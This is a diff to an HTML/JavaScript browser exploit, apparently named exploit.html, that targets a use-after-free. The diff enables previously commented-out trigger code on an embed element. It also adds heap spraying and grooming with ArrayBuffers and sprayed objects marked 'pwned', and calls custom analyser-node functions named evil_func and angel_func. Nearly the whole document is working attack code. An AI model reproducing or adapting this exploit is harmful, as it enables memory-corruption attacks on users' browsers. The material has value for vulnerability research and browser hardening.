@@ -1,10 +1,22 @@
+<body onload="start();">
+<embed id="worker" src="data:video/mp4;"></embed>
 <script>
+var analyserNode;
+var barrier;
+
+function MyObject() {
+    this.name = "Object";
+    this.scriptObject = {
+    	GetURL: "hahahaha",
+    }
+}
+
 function start()
 {
-    // worker = document.getElementById("worker");
+    worker = document.getElementById("worker");
     window.top.document.getElementById("cur").addEventListener("DOMNodeInserted", callback0);
     var intl = setInterval(function(){
-        // worker.GetURL.a = 777;
+        worker.GetURL.a = 777;
         window.top.f();
         clearInterval(intl);
     }, 1);
@@ -13,14 +25,26 @@ function callback0(ev) {
     window.requestAnimationFrame(callback);
 }
 function gc() {
-    for (let i = 0; i < 0x40; i++) { new ArrayBuffer(0x1000000); }
+    for (let i = 0; i < 0x60; i++) { new ArrayBuffer(0x1000000); }
 }
 function callback(ev) {
-    // gc();
-    // alert(worker.GetURL.a); // UAF here.
+    gc();
+    barrier = new MyObject();
+    analyserNode.evil_func(worker);
+    for (let i = 0; i < 230; ++i) { 
+	var tmp = {GetURL: "pwned", b: "b", c: "c", d: "d", e: "e"};
+	analyserNode.angel_func(worker, tmp);
+    }
+    // alert("Worker: " + worker + " --- GetURL(): " + worker.GetURL); // UAF here.
+    worker.fuck = "you";
 }
+
+try {
+    audioContext = new AudioContext();
+} catch(e) {
+    alert('Web Audio API is not supported in this browser');
+}
+analyserNode = audioContext.createAnalyser();
+
 </script>
-<body onload="start();">
-    exploit.html
-<embed id="worker" src="data:video/mp4;"></embed>
 </body>
